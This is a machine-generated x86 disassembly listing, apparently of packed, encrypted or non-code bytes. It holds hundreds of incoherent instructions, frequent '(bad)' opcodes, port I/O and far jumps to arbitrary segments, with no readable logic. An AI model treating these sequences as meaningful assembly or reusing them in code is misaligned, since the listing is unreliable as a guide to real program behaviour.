  40a696:	cmp    eax,0xed0f3149
  40a69b:	inc    ebp
  40a69c:	dec    esp
  40a69d:	jae    0x40a646
  40a69f:	pop    ds
  40a6a0:	xor    eax,0xd8c51a2f
  40a6a5:	rcr    DWORD PTR [esi],0xb2
  40a6a8:	(bad)  
  40a6aa:	sub    BYTE PTR [edx+0x67b966a6],ch
  40a6b0:	dec    esp
  40a6b1:	cmc    
  40a6b2:	int3   
  40a6b3:	hlt    
  40a6b4:	int3   
  40a6b5:	(bad)  
  40a6b6:	popa   
  40a6b7:	(bad)  
  40a6b8:	out    0x4d,al
  40a6ba:	push   edx
  40a6bb:	mov    bl,0x7
  40a6bd:	out    dx,eax
  40a6be:	jmp    0xcab03a89
  40a6c3:	rcr    BYTE PTR [edx+eiz*1+0x40496c90],1
  40a6ca:	outs   dx,BYTE PTR ds:[esi]
  40a6cb:	add    dl,BYTE PTR [ebx]
  40a6cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a6ce:	inc    ebp
  40a6cf:	jecxz  0x40a65a
  40a6d1:	lahf   
  40a6d2:	pop    ebx
  40a6d3:	or     al,0xe3
  40a6d5:	test   eax,0x96efead3
  40a6da:	push   ebx
  40a6db:	nop
  40a6dc:	pushf  
  40a6dd:	xchg   BYTE PTR [esi],dh
  40a6df:	fwait
  40a6e0:	mov    ds:0xb3b3e64c,eax
  40a6e5:	sbb    al,0xfd
  40a6e7:	imul   edx,DWORD PTR [edx-0x3b],0xffffff9f
  40a6eb:	fistp  WORD PTR [eax-0x18a9463e]
  40a6f1:	and    dh,BYTE PTR [edx+eiz*8-0x38]
  40a6f5:	push   cs
  40a6f6:	cmp    edi,DWORD PTR [edx+0x4b7e302b]
  40a6fc:	xchg   edx,eax
  40a6fd:	into   
  40a6fe:	adc    eax,DWORD PTR [edi+0x7813d1a7]
  40a704:	xor    al,0xed
  40a706:	mov    dh,BYTE PTR [eax]
  40a708:	xor    edx,eax
  40a70a:	iret   
  40a70b:	jno    0x40a712
  40a70d:	xchg   ebx,eax
  40a70e:	xchg   ecx,eax
  40a70f:	xlat   BYTE PTR ds:[ebx]
  40a710:	(bad)  
  40a711:	scas   al,BYTE PTR es:[edi]
  40a712:	push   ds
  40a713:	pop    eax
  40a714:	push   ds
  40a715:	inc    esp
  40a716:	add    edi,ebx
  40a718:	mov    eax,gs:0xdf9fb2b3
  40a71e:	cmp    eax,DWORD PTR [edx]
  40a720:	xchg   edi,eax
  40a721:	cli    
  40a722:	dec    esi
  40a723:	add    al,0x3f
  40a725:	lods   eax,DWORD PTR ds:[esi]
  40a726:	out    dx,al
  40a727:	sbb    BYTE PTR [ebp-0x53],bh
  40a72a:	in     eax,0x3a
  40a72c:	fist   DWORD PTR [ecx-0xcef0afa]
  40a732:	test   DWORD PTR [ebx-0x1a7b3ae7],esi
  40a738:	mov    al,ds:0x2ece1289
  40a73d:	push   ds
  40a73e:	dec    esi
  40a73f:	inc    eax
  40a740:	popf   
  40a741:	mov    eax,0x6e56eaa
  40a746:	mov    bh,0xc9
  40a748:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a749:	sbb    ch,BYTE PTR [ebx+ecx*4-0x59]
  40a74d:	xchg   esp,eax
  40a74e:	mov    ds:0x2279f557,al
  40a753:	add    eax,0x5de560ad
  40a758:	push   eax
  40a759:	mov    ebp,DWORD PTR ss:[eax+0x31]
  40a75d:	addr16 es jge 0x40a7c5
  40a761:	idiv   DWORD PTR [edx+0x2e]
  40a764:	popa   
  40a765:	push   cs
  40a766:	fild   QWORD PTR [ebp-0x66eff111]
  40a76c:	sub    dl,BYTE PTR [ebp-0x9483872]
  40a772:	sbb    BYTE PTR [edx+0x6b],0x6c
  40a776:	ja     0x40a7b3
  40a778:	rcr    BYTE PTR [ebx],0xc8
  40a77b:	jecxz  0x40a776
  40a77d:	ret    
  40a77e:	add    BYTE PTR [edi+0x296ae15f],0xd8
  40a785:	push   ecx
  40a786:	repz int 0xfd
  40a789:	mov    dh,0xd5
  40a78b:	aaa    
  40a78c:	in     eax,dx
  40a78d:	into   
  40a78e:	shl    DWORD PTR [edi],1
  40a790:	mov    ah,0x8d
  40a792:	and    dl,BYTE PTR ds:0x9b420ff8
  40a798:	adc    al,0xa
  40a79a:	cwde   
  40a79b:	and    DWORD PTR [eax+0x2632f37],eax
  40a7a1:	aaa    
  40a7a2:	addr16 jbe 0x40a810
  40a7a5:	fcomip st,st(0)
  40a7a7:	or     BYTE PTR [edx-0x26],dh
  40a7aa:	hlt    
  40a7ab:	setg   dl
  40a7ae:	or     eax,0x9a7b79ee
  40a7b3:	cmp    eax,0x69fb150
  40a7b8:	inc    ecx
  40a7b9:	add    cl,BYTE PTR [ecx+0x63]
  40a7bc:	cld    
  40a7bd:	mov    eax,ds:0x3bf81b7f
  40a7c2:	fidiv  DWORD PTR [edi]
  40a7c4:	mov    bl,0x1f
  40a7c6:	inc    edx
  40a7c7:	jl     0x40a7bf
  40a7c9:	inc    ecx
  40a7ca:	or     esp,DWORD PTR [eax]
  40a7cc:	sub    al,0x79
  40a7ce:	mov    dh,0xb5
  40a7d0:	pop    esp
  40a7d1:	pusha  
  40a7d2:	hlt    
  40a7d3:	mov    es,WORD PTR [ecx]
  40a7d5:	mov    edi,ss
  40a7d7:	jne    0x40a77a
  40a7d9:	inc    ecx
  40a7da:	inc    eax
  40a7db:	hlt    
  40a7dc:	es pop esp
  40a7de:	sub    eax,0x5cf27f55
  40a7e3:	cli    
  40a7e4:	push   0xd843f592
  40a7e9:	cmp    eax,0x5a2e4d1
  40a7ee:	push   ss
  40a7ef:	mov    ds:0x2362c789,eax
  40a7f4:	lahf   
  40a7f5:	fsubr  st(3),st
  40a7f7:	cmp    eax,0xa25fefbb
  40a7fc:	xchg   edi,eax
  40a7fd:	in     al,0xda
  40a7ff:	fdivrp st(0),st
  40a801:	dec    ecx
  40a802:	out    0xd9,al
  40a804:	cmp    eax,0x37635fc6
  40a809:	in     eax,dx
  40a80a:	jo     0x40a7ee
  40a80c:	js     0x40a7ef
  40a80e:	dec    edi
  40a80f:	(bad)  
  40a810:	stos   DWORD PTR es:[edi],eax
  40a811:	rol    BYTE PTR [eax-0x1d87069],1
  40a817:	in     eax,dx
  40a818:	push   ecx
  40a819:	adc    eax,0x3023db55
  40a81e:	xchg   ecx,eax
  40a81f:	cmp    BYTE PTR [eax+ebx*8-0x70],bh
  40a823:	adc    edx,edi
  40a825:	call   0x5b17d5e4
  40a82a:	sar    BYTE PTR [ebx+0x31887266],cl
  40a830:	out    0x1b,eax
  40a832:	mov    bl,0xf7
  40a834:	push   ss
  40a835:	mov    ecx,0x35bedd97
  40a83a:	inc    ecx
  40a83b:	sub    eax,0x7aafb138
  40a840:	adc    al,0x2c
  40a842:	mov    bl,0x45
  40a844:	das    
  40a845:	xor    edx,ebp
  40a847:	mov    bh,0x6d
  40a849:	or     dl,dl
  40a84b:	shl    DWORD PTR [ecx],cl
  40a84d:	in     al,0x80
  40a84f:	loope  0x40a861
  40a851:	xchg   esi,eax
  40a852:	stos   BYTE PTR es:[edi],al
  40a853:	aaa    
  40a854:	int3   
  40a855:	nop
  40a856:	leave  
  40a857:	mov    WORD PTR [edi+0x28471b36],?
  40a85d:	cmc    
  40a85e:	cmc    
  40a85f:	add    al,0x94
  40a861:	sahf   
  40a862:	push   esp
  40a863:	imul   edx,ebx,0xf35914a5
  40a869:	push   esi
  40a86a:	clc    
  40a86b:	dec    ebp
  40a86c:	bound  edi,QWORD PTR es:[ebx]
  40a86f:	pop    ebp
  40a870:	scas   al,BYTE PTR es:[edi]
  40a871:	xchg   ebx,eax
  40a872:	(bad)  
  40a873:	into   
  40a874:	mov    al,ds:0x64ecc4ab
  40a879:	xor    al,0x5
  40a87b:	sub    DWORD PTR [edx-0x23],eax
  40a87e:	mov    ah,0x6f
  40a880:	jne    0x40a8d7
  40a882:	rcr    BYTE PTR [ecx+0x33],0x56
  40a886:	adc    al,0xa
  40a888:	pop    esp
  40a889:	adc    DWORD PTR [ecx+0x30],ebx
  40a88c:	popf   
  40a88d:	aam    0x10
  40a88f:	push   ss
  40a890:	jecxz  0x40a862
  40a892:	mov    edi,DWORD PTR [esi-0x46891a89]
  40a898:	push   es
  40a899:	jns    0x40a8c5
  40a89b:	ss fsubrp st(4),st
  40a89e:	int    0xc1
  40a8a0:	int3   
  40a8a1:	sti    
  40a8a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a8a3:	cmp    al,BYTE PTR [edi+0x75]
  40a8a6:	mov    al,BYTE PTR [ebp-0xf]
  40a8a9:	pop    ebp
  40a8aa:	aas    
  40a8ab:	jle    0x40a914
  40a8ad:	and    DWORD PTR [ebx+0xf5a3caf],0xffffffa2
  40a8b4:	mov    ecx,ebx
  40a8b6:	stos   DWORD PTR es:[edi],eax
  40a8b7:	scas   al,BYTE PTR es:[edi]
  40a8b8:	inc    ebp
  40a8b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a8ba:	add    dh,BYTE PTR [esp+ebx*4-0xec48bd9]
  40a8c1:	lods   eax,DWORD PTR ds:[esi]
  40a8c2:	mov    ch,0x20
  40a8c4:	mov    dl,0xa3
  40a8c6:	pop    ebp
  40a8c7:	or     bl,BYTE PTR [ebx]
  40a8c9:	pop    edi
  40a8ca:	cmp    al,0xd3
  40a8cc:	shl    DWORD PTR [eax+0x55],1
  40a8cf:	cmp    al,0xcf
  40a8d1:	adc    dh,BYTE PTR [ecx-0x27]
  40a8d4:	cs ins BYTE PTR es:[edi],dx
  40a8d6:	sbb    BYTE PTR [ecx],0x88
  40a8d9:	cli    
  40a8da:	push   ebp
  40a8db:	push   0x752d51f8
  40a8e0:	repnz or al,0xd9
  40a8e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a8e4:	push   0x50
  40a8e6:	jg     0x40a872
  40a8e8:	mov    bl,0xd2
  40a8ea:	scas   eax,DWORD PTR es:[edi]
  40a8eb:	sbb    esi,edi
  40a8ed:	nop
  40a8ee:	gs loop 0x40a96d
  40a8f1:	mov    bl,BYTE PTR [edx+0x71b4e508]
  40a8f7:	and    eax,DWORD PTR [edx]
  40a8f9:	outs   dx,BYTE PTR ds:[esi]
  40a8fa:	mov    cl,0xe5
  40a8fc:	xlat   BYTE PTR ds:[ebx]
  40a8fd:	(bad)
  40a900:	mov    ds,WORD PTR [ebx-0x4f6b04ae]
  40a906:	jle    0x40a966
  40a908:	pop    ss
  40a909:	cld    
  40a90a:	cmp    eax,0x82e34a48
  40a90f:	adc    dl,0x8d
  40a912:	cmc    
  40a913:	ror    esi,0xe9
  40a916:	loopne 0x40a993
  40a918:	shr    BYTE PTR [edx],cl
  40a91a:	enter  0x14db,0xe7
  40a91e:	push   0xea362765
  40a923:	xor    al,0xcf
  40a925:	loope  0x40a8df
  40a927:	lea    ebp,[edi+ebp*8-0x10c1dd8b]
  40a92e:	fidivr WORD PTR [edx+0x31]
  40a931:	std    
  40a932:	inc    eax
  40a933:	call   FWORD PTR [ecx]
  40a935:	das    
  40a936:	dec    ecx
  40a937:	jns    0x40a999
  40a939:	test   DWORD PTR ds:0x1650168c,0x891b793f
  40a943:	test   eax,0xb00a2806
  40a948:	adc    eax,0xe0d7d6b8
  40a94d:	sbb    al,ch
  40a94f:	ins    BYTE PTR es:[edi],dx
  40a950:	dec    ebx
  40a951:	xlat   BYTE PTR ds:[ebx]
  40a952:	pop    esp
  40a953:	jmp    0x3569:0x8294713
  40a95a:	ja     0x40a933
  40a95c:	or     ecx,DWORD PTR [edx]
  40a95e:	adc    al,0x3a
  40a960:	jne    0x40a948
  40a962:	push   ebp
  40a963:	mov    eax,0xfc96b489
  40a968:	pop    ds
  40a969:	dec    edi
  40a96a:	jecxz  0x40a959
  40a96c:	std    
  40a96d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a96e:	je     0x40a9c2
  40a970:	js     0x40a9e0
  40a972:	sub    cl,BYTE PTR [ebx]
  40a974:	lock xor al,0x22
  40a977:	and    al,0x9d
  40a979:	dec    ebp
  40a97a:	and    ah,al
  40a97c:	mov    edi,?
  40a97e:	jmp    0x277508b3
  40a983:	sub    DWORD PTR [ecx+0x32d21b17],esi
  40a989:	into   
  40a98a:	mov    esp,0x493e3df0
  40a98f:	push   ebp
  40a990:	dec    esi
  40a991:	pop    ss
  40a992:	and    edi,ecx
  40a994:	jbe    0x40a927
  40a996:	cmp    eax,0x851be704
  40a99b:	int    0x34
  40a99d:	mov    DWORD PTR [eax+0x33],edi
  40a9a0:	xchg   ecx,eax
  40a9a1:	xor    DWORD PTR [eax],edi
  40a9a3:	or     dh,ch
  40a9a5:	push   ss
  40a9a6:	icebp  
  40a9a7:	xor    al,0xc5
  40a9a9:	outs   dx,BYTE PTR ds:[esi]
  40a9aa:	dec    ebp
  40a9ab:	adc    al,0x6c
  40a9ad:	xchg   BYTE PTR [edi+0x5e],bl
  40a9b0:	aad    0x3b
  40a9b2:	(bad)  
  40a9b3:	mov    bl,0x57
  40a9b5:	sti    
  40a9b6:	scas   al,BYTE PTR es:[edi]
  40a9b7:	xchg   esp,eax
  40a9b8:	dec    ecx
  40a9b9:	or     edx,DWORD PTR [esi]
  40a9bb:	mov    DWORD PTR [ecx],edi
  40a9bd:	enter  0x8a33,0x33
  40a9c1:	inc    ebx
  40a9c2:	ins    DWORD PTR es:[edi],dx
  40a9c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a9c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a9c5:	xchg   esp,eax
  40a9c6:	xchg   ebx,eax
  40a9c7:	fstp   DWORD PTR [edi]
  40a9c9:	shl    cl,cl
  40a9cb:	aas    
  40a9cc:	nop
  40a9cd:	addr16 or eax,0xcaf47363
  40a9d3:	push   ss
  40a9d4:	jne    0x40a9ad
  40a9d6:	cmp    al,0x6e
  40a9d8:	cdq    
  40a9d9:	cmp    eax,0xca305443
  40a9de:	or     al,0x2a
  40a9e0:	dec    edi
  40a9e1:	aas    
  40a9e2:	adc    ecx,DWORD PTR gs:[ebp+0x27]
  40a9e6:	dec    eax
  40a9e7:	in     eax,dx
  40a9e8:	mov    ebx,0x3ef5ed16
  40a9ed:	icebp  
  40a9ee:	rcl    BYTE PTR [eax-0x201a232d],0xd5
  40a9f5:	retf   0x1b60
  40a9f8:	xchg   esi,eax
  40a9f9:	test   al,0xc5
  40a9fb:	jbe    0x40a9d6
  40a9fd:	mov    DWORD PTR [edi+0x7dcc3122],0xef5a770d
  40aa07:	sub    cl,dl
  40aa09:	aad    0xaa
  40aa0b:	(bad)  
  40aa0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aa0d:	cmc    
  40aa0e:	shl    BYTE PTR [eax],cl
  40aa10:	repnz imul edi,eax,0xb23404a2
  40aa17:	add    al,0x12
  40aa19:	mov    dh,BYTE PTR [ecx]
  40aa1b:	mov    dh,0x7f
  40aa1d:	jp     0x40aa81
  40aa1f:	out    0x50,al
  40aa21:	out    0x4a,eax
  40aa23:	aaa    
  40aa24:	dec    ebp
  40aa25:	sti    
  40aa26:	fild   WORD PTR [eax-0x38]
  40aa29:	dec    ebx
  40aa2a:	into   
  40aa2b:	add    esi,DWORD PTR [ebx]
  40aa2d:	scas   al,BYTE PTR es:[edi]
  40aa2e:	xchg   esp,eax
  40aa2f:	jmp    0x78c1:0xa168b59d
  40aa36:	dec    esi
  40aa37:	cmp    DWORD PTR [edx],0xffffffab
  40aa3a:	dec    ebp
  40aa3b:	add    eax,0xc9e137ae
  40aa40:	jl     0x40aa49
  40aa42:	sbb    al,0xa8
  40aa44:	ins    BYTE PTR es:[edi],dx
  40aa45:	leave  
  40aa46:	mov    edx,0x82e31713
  40aa4b:	nop
  40aa4c:	(bad)  
  40aa4d:	xor    bh,ch
  40aa4f:	retf   0x31c9
  40aa52:	call   0x2e6c:0x484ad442
  40aa59:	inc    eax
  40aa5a:	xchg   DWORD PTR [eax+0x31f7cafe],ebp
  40aa60:	adc    edx,0x1066a9e0
  40aa66:	pop    esp
  40aa67:	jo     0x40aa4f
  40aa69:	lods   al,BYTE PTR ds:[esi]
  40aa6a:	sbb    eax,0x4d802ff6
  40aa6f:	and    BYTE PTR [edi+0x3f9452a7],al
  40aa75:	pusha  
  40aa76:	cdq    
  40aa77:	jge    0x40aa73
  40aa79:	mov    dh,0xd4
  40aa7b:	mov    edx,0x38fa0a13
  40aa80:	xchg   esi,eax
  40aa81:	lods   al,BYTE PTR ds:[esi]
  40aa82:	ds push cs
  40aa84:	and    dl,BYTE PTR [esp+eax*4]
  40aa87:	jmp    0xf075:0x9cb3253
  40aa8e:	fcmovbe st,st(2)
  40aa90:	fstp   st(2)
  40aa92:	ins    DWORD PTR es:[edi],dx
  40aa93:	sbb    bh,BYTE PTR [ecx]
  40aa95:	mov    dl,0x8e
  40aa97:	sahf   
  40aa98:	inc    ebx
  40aa99:	lds    esi,FWORD PTR [esi+0x45]
  40aa9c:	stos   DWORD PTR es:[edi],eax
  40aa9d:	cs dec esi
  40aa9f:	mov    ah,ch
  40aaa1:	xor    DWORD PTR [ebp+0x27d46d6],ecx
  40aaa7:	sub    BYTE PTR [ebp-0x13a6474c],0x17
  40aaae:	sub    ebx,DWORD PTR [ecx+0x31ac2811]
  40aab4:	leave  
  40aab5:	sub    BYTE PTR [edx],cl
  40aab7:	sbb    al,0x22
  40aab9:	sub    eax,0x6cfa754e
  40aabe:	or     DWORD PTR [ecx+0x657ca75b],esi
  40aac4:	inc    ecx
  40aac5:	cmp    edi,edx
  40aac7:	inc    ebx
  40aac8:	test   DWORD PTR [ebx-0x19cc2164],ebp
  40aace:	inc    edi
  40aacf:	fsub   QWORD PTR [ebp-0x34]
  40aad2:	dec    eax
  40aad3:	(bad)
  40aad7:	sub    BYTE PTR [edi-0x58820c2a],dh
  40aadd:	and    dh,BYTE PTR [ecx+0xb]
  40aae0:	or     cl,BYTE PTR [eax+0x8a3ab88]
  40aae6:	fs int 0x33
  40aae9:	mov    ds:0x9b723fcb,eax
  40aaee:	xor    ebp,esp
  40aaf0:	rol    DWORD PTR [edi+eiz*2],1
  40aaf3:	dec    edi
  40aaf4:	adc    DWORD PTR [ebx],ecx
  40aaf6:	in     al,0x44
  40aaf8:	lods   al,BYTE PTR ds:[esi]
  40aaf9:	inc    esp
  40aafa:	mov    fs,WORD PTR [edx]
  40aafc:	gs into 
  40aafe:	inc    ebp
  40aaff:	ins    DWORD PTR es:[di],dx
  40ab01:	or     esi,DWORD PTR [eax-0x783fb061]
  40ab07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab08:	in     eax,dx
  40ab09:	jb     0x40ab4b
  40ab0b:	mov    bh,0x90
  40ab0d:	ins    BYTE PTR es:[edi],dx
  40ab0e:	jp     0x40ab54
  40ab10:	pushf  
  40ab11:	push   0xffffff86
  40ab13:	mov    ebx,0x8ba1d9f3
  40ab18:	xchg   edx,eax
  40ab19:	sbb    esp,DWORD PTR [edi]
  40ab1b:	mov    DWORD PTR [ecx+edx*8],edx
  40ab1e:	sub    DWORD PTR [eax-0x3a6496a4],ecx
  40ab24:	add    esp,0x3fa31ecf
  40ab2a:	mov    BYTE PTR [edi-0x494ac2ba],dl
  40ab30:	mov    cl,0x32
  40ab32:	mov    ecx,0x207ad7bf
  40ab37:	loope  0x40ab95
  40ab39:	mov    ecx,0x24ea13ec
  40ab3e:	(bad)  
  40ab3f:	mov    edx,0xd843017c
  40ab44:	mov    ecx,0x409c3ce7
  40ab49:	mov    ebp,0x76adcc09
  40ab4e:	popf   
  40ab4f:	pop    ebx
  40ab50:	shl    BYTE PTR [esi+0x3237f61c],0x77
  40ab57:	mov    cl,0x96
  40ab59:	inc    edi
  40ab5a:	sub    eax,0x72bb9588
  40ab5f:	stos   DWORD PTR es:[edi],eax
  40ab60:	(bad)  
  40ab61:	aad    0x2f
  40ab63:	call   0x7d35:0x7a4b1ba
  40ab6a:	mov    ah,0xb7
  40ab6c:	add    al,0xf3
  40ab6e:	xchg   ecx,eax
  40ab6f:	jae    0x40ab9e
  40ab71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab72:	icebp  
  40ab73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab74:	jne    0x40abd2
  40ab76:	cmc    
  40ab77:	fisubr DWORD PTR [ecx+edx*4]
  40ab7a:	test   al,0xc8
  40ab7c:	inc    edi
  40ab7d:	cmp    ebx,edi
  40ab7f:	sbb    ah,0x15
  40ab82:	mov    al,0xbd
  40ab84:	push   edi
  40ab85:	loop   0x40ab9c
  40ab87:	aas    
  40ab88:	popf   
  40ab89:	xchg   BYTE PTR [edx],ah
  40ab8b:	jle    0x40abaf
  40ab8d:	dec    edx
  40ab8e:	outs   dx,BYTE PTR ds:[esi]
  40ab8f:	inc    edi
  40ab90:	sub    al,0x5a
  40ab92:	and    ch,BYTE PTR [edi]
  40ab94:	xor    BYTE PTR [edi-0x7d],cl
  40ab97:	repz (bad)
  40ab9a:	stos   DWORD PTR es:[edi],eax
  40ab9b:	mov    eax,DWORD PTR [ebp+eax*4+0x71b5e05c]
  40aba2:	outs   dx,BYTE PTR ds:[esi]
  40aba3:	pop    ds
  40aba4:	out    dx,al
  40aba5:	ins    DWORD PTR es:[edi],dx
  40aba6:	mov    dl,BYTE PTR ds:0x6fcaceac
  40abac:	fmul   QWORD PTR ds:0x9f5182a5
  40abb2:	scas   al,BYTE PTR es:[edi]
  40abb3:	sub    al,BYTE PTR [ecx]
  40abb5:	inc    edi
  40abb6:	repz loopne 0x40aba4
  40abb9:	pop    ebp
  40abba:	lock (bad) 
  40abbc:	sbb    al,0x7
  40abbe:	dec    ecx
  40abbf:	pusha  
  40abc0:	out    dx,al
  40abc1:	xor    edx,DWORD PTR [eax+0x2876a1b0]
  40abc7:	dec    edx
  40abc8:	fcomip st,st(6)
  40abca:	loop   0x40ab72
  40abcc:	inc    ebx
  40abcd:	rol    DWORD PTR [ebx],0xf7
  40abd0:	mov    edi,0x42c40e23
  40abd5:	add    ebp,DWORD PTR [eax+0x32]
  40abd8:	sahf   
  40abd9:	pop    ds
  40abda:	repz test eax,0x13a6b267
  40abe0:	push   edi
  40abe1:	inc    esp
  40abe2:	push   ebx
  40abe3:	add    ch,BYTE PTR [edi]
  40abe5:	add    dl,dl
  40abe7:	inc    edx
  40abe8:	push   eax
  40abe9:	mov    ah,0x9f
  40abeb:	je     0x40ac67
  40abed:	sbb    eax,0x3bd40e6f
  40abf2:	dec    esp
  40abf3:	jo     0x40ac70
  40abf5:	in     eax,0x9c
  40abf7:	jecxz  0x40abcb
  40abf9:	ror    BYTE PTR [edx-0x62],0x5f
  40abfd:	push   eax
  40abfe:	pop    esi
  40abff:	icebp  
  40ac00:	addr16 das 
  40ac02:	or     BYTE PTR [esi-0x236bb1da],cl
  40ac08:	rol    ah,cl
  40ac0a:	mov    ebx,cs
  40ac0c:	pop    ebx
  40ac0d:	std    
  40ac0e:	cs retf 
  40ac10:	xor    BYTE PTR [ebx+0x6b44ff70],bl
  40ac16:	add    ebp,DWORD PTR ds:0xb28e1ca4
  40ac1c:	and    esi,esi
  40ac1e:	mov    dh,0x83
  40ac20:	sub    dh,bh
  40ac22:	jmp    FWORD PTR ds:[ebp+ebp*4+0x66]
  40ac27:	test   ch,bl
  40ac29:	or     dl,BYTE PTR [edi-0x7ab5aab7]
  40ac2f:	push   cs
  40ac30:	out    0x63,eax
  40ac32:	jns    0x40ac42
  40ac34:	jmp    0x26024800
  40ac39:	addr16 push es
  40ac3b:	(bad)
  40ac40:	mov    edx,0x5d6d2686
  40ac45:	les    ecx,FWORD PTR [ebx+esi*2]
  40ac48:	and    bh,BYTE PTR [eax+edi*8-0x30]
  40ac4c:	xchg   BYTE PTR [esi],al
  40ac4e:	stos   BYTE PTR es:[edi],al
  40ac4f:	cmc    
  40ac50:	or     BYTE PTR [eax+0x26],0x7e
  40ac54:	cmp    eax,0x9414b841
  40ac59:	push   esp
  40ac5a:	push   edx
  40ac5b:	push   edi
  40ac5c:	arpl   cx,sp
  40ac5e:	mov    edx,fs
  40ac60:	mov    bl,0x3e
  40ac62:	or     esi,DWORD PTR [ebp+eiz*4+0x64866208]
  40ac69:	xchg   ebx,eax
  40ac6a:	fnstcw WORD PTR [esi]
  40ac6c:	push   esi
  40ac6d:	mov    bl,0x82
  40ac6f:	dec    ecx
  40ac70:	xor    BYTE PTR [ebx],ch
  40ac72:	mov    WORD PTR [edx+0x5],es
  40ac75:	ins    DWORD PTR es:[edi],dx
  40ac76:	jmp    0x7e6c8b18
  40ac7b:	jb     0x40ac28
  40ac7d:	adc    al,0x2b
  40ac7f:	popf   
  40ac80:	(bad)  
  40ac81:	or     DWORD PTR [ecx-0x42772b25],ebp
  40ac87:	std    
  40ac88:	inc    esp
  40ac89:	inc    esi
  40ac8a:	cmp    ch,BYTE PTR [esi]
  40ac8c:	enter  0xd52d,0xc8
  40ac90:	sbb    DWORD PTR ds:0x2bded7b4,ecx
  40ac96:	adc    BYTE PTR ds:[eax+edi*1-0x55],ch
  40ac9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac9c:	outs   dx,BYTE PTR ds:[esi]
  40ac9d:	clc    
  40ac9e:	inc    esi
  40ac9f:	push   ss
  40aca0:	xor    eax,0xf4d70d5a
  40aca5:	mov    dl,0xf8
  40aca7:	dec    esp
  40aca8:	es cmp eax,0x3b175edb
  40acae:	push   ds
  40acaf:	ror    BYTE PTR [eax-0x6b32f82f],cl
  40acb5:	(bad)  
  40acb6:	fcmovnu st,st(7)
  40acb8:	pop    edi
  40acb9:	int3   
  40acba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40acbb:	jle    0x40ad0d
  40acbd:	cld    
  40acbe:	pop    edx
  40acbf:	mov    bh,0xf6
  40acc1:	repnz div DWORD PTR [esi+0x6e]
  40acc5:	cmp    ebx,edi
  40acc7:	ret    0x8496
  40acca:	loopne 0x40ace9
  40accc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40accd:	add    cl,dh
  40accf:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  40acd1:	test   al,0x7e
  40acd3:	push   ebx
  40acd4:	gs ret 
  40acd6:	jp     0x40acbd
  40acd8:	add    al,0xb3
  40acda:	and    al,0x18
  40acdc:	inc    edi
  40acdd:	dec    ebx
  40acde:	es sti 
  40ace0:	cmp    ebp,esi
  40ace2:	mov    dh,0x9f
  40ace4:	xor    eax,0x5943b546
  40ace9:	dec    esi
  40acea:	jbe    0x40ac71
  40acec:	xchg   esi,eax
  40aced:	fild   WORD PTR [edx+eax*4+0x48fd51d0]
  40acf4:	adc    DWORD PTR [edx],0x38
  40acf7:	cmc    
  40acf8:	xor    dl,bl
  40acfa:	mov    ebp,0xb0473bae
  40acff:	and    BYTE PTR [edx-0x63],ch
  40ad02:	fdivr  DWORD PTR [edi-0x51]
  40ad05:	test   al,0x4
  40ad07:	and    DWORD PTR [edi+eiz*2-0x15],edi
  40ad0b:	in     al,0x61
  40ad0d:	fsub   DWORD PTR [edi-0x70]
  40ad10:	cli    
  40ad11:	mov    WORD PTR [ecx-0x5d],ds
  40ad14:	or     DWORD PTR [ebp+0x69372d2d],esi
  40ad1a:	or     eax,0x1c203b29
  40ad1f:	xor    eax,0x9b605768
  40ad24:	pusha  
  40ad25:	inc    ebp
  40ad26:	mov    DWORD PTR [eax+0x77],ebx
  40ad29:	in     al,0xdf
  40ad2b:	add    DWORD PTR [ecx],ebx
  40ad2d:	cmc    
  40ad2e:	daa    
  40ad2f:	xchg   ecx,eax
  40ad30:	dec    ebp
  40ad31:	lods   eax,DWORD PTR ds:[esi]
  40ad32:	fmul   QWORD PTR [ebp-0x71]
  40ad35:	cs aaa 
  40ad37:	stc    
  40ad38:	xlat   BYTE PTR ss:[ebx]
  40ad3a:	mov    DWORD PTR [esi-0x17cce32],edx
  40ad40:	pop    edx
  40ad41:	xchg   ebx,eax
  40ad42:	xor    dh,BYTE PTR [edi]
  40ad44:	mov    BYTE PTR [ecx+0x42],dh
  40ad47:	cmp    BYTE PTR [edx],al
  40ad49:	push   ebp
  40ad4a:	dec    ecx
  40ad4b:	ret    
  40ad4c:	push   esp
  40ad4d:	outs   dx,DWORD PTR ds:[esi]
  40ad4e:	and    eax,DWORD PTR [edi+0x2e7f9b8c]
  40ad54:	and    al,0x26
  40ad56:	mov    bl,al
  40ad58:	ja     0x40ad51
  40ad5a:	repnz lea edx,[ebp-0x3c]
  40ad5e:	xor    DWORD PTR [eax-0x56057f08],ecx
  40ad64:	xor    ebx,edx
  40ad66:	enter  0xef09,0x5e
  40ad6a:	sub    bh,al
  40ad6c:	mov    esp,0xab14eb9c
  40ad71:	pop    ebx
  40ad72:	(bad)  
  40ad73:	jecxz  0x40acf6
  40ad75:	push   edi
  40ad76:	jmp    0x40ad41
  40ad78:	mov    eax,0xfdb60016
  40ad7d:	hlt    
  40ad7e:	xchg   ecx,eax
  40ad7f:	lahf   
  40ad80:	in     eax,dx
  40ad81:	aaa    
  40ad82:	add    BYTE PTR [esi+0x13d488bd],al
  40ad88:	fmul   DWORD PTR [esi]
  40ad8a:	xchg   DWORD PTR [eax],esp
  40ad8c:	add    BYTE PTR [edi-0x4593dc12],bl
  40ad92:	sub    edx,DWORD PTR [esi-0x11]
  40ad95:	xor    ch,dh
  40ad97:	neg    BYTE PTR [esi+0x4f5274a0]
  40ad9d:	add    BYTE PTR [ebx],ah
  40ad9f:	push   ecx
  40ada0:	inc    ecx
  40ada1:	leave  
  40ada2:	and    edi,DWORD PTR [ecx+0x1268e0ac]
